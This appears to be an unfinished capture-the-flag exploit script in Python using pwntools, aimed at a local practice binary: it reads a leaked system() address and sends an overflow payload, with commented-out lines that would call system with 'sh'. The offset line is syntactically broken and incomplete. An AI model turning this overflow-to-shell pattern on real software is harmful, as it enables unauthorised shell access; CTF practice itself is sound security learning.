#!/usr/bin/env python3
import pwn
import struct

pwn.context.log_level = "debug"

p = pwn.process("./mychall")

p.recvuntil(b'r ')

sys_addr = int(p.recvuntil(b'.', drop=True), 16)

offset = 108 +

payload = b"\x00" * offset
# payload += pwn.p64(sys_addr)
# payload += pwn.p64(0)
# payload += b"sh;\x00"

p.clean()

p.sendline(payload)

p.interactive()
